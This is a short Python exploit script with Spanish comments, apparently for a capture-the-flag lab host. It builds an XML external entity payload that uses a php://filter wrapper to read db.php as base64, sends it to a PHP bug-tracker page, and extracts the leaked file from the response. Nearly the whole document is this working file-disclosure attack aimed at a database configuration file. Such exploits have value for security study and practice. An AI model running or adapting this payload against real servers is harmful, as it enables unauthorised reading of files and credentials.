#!/usr/bin/python3
#coding: utf-8

from pwn import *
import requests
import urllib.parse
import base64
import re
import html
import urllib.request

#Variables globales
main_url = "http://10.10.11.100/tracker_diRbPr00f314.php"
#burp = {'http': 'http://127.0.0.1:8080'}

def def_handler(sig, frame):
        print("Saliendo...")
        sys.exit(0)
signal.signal(signal.SIGINT, def_handler)

def MakeRequest():

        #Coficacion en base64
        xxe_payload = """<?xml  version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=db.php'>]> <bugreport> <title>&test;</title> <cwe>test</cwe> <cvss>test</cvss> <reward>test</reward> </bugreport>"""
        xxe_payload_bytes = xxe_payload.encode('ascii')
        base64_bytes = base64.b64encode(xxe_payload_bytes)
        base64_xxe_payload = base64_bytes.decode('ascii')

        data_post = {
                'data': base64_xxe_payload
        }

        r = requests.get(main_url, data=data_post)

        db_file = re.findall(r'<td>Title:</td><td>(.*?)<td>', r.text)[0]


if __name__ == '__main__':
        MakeRequest()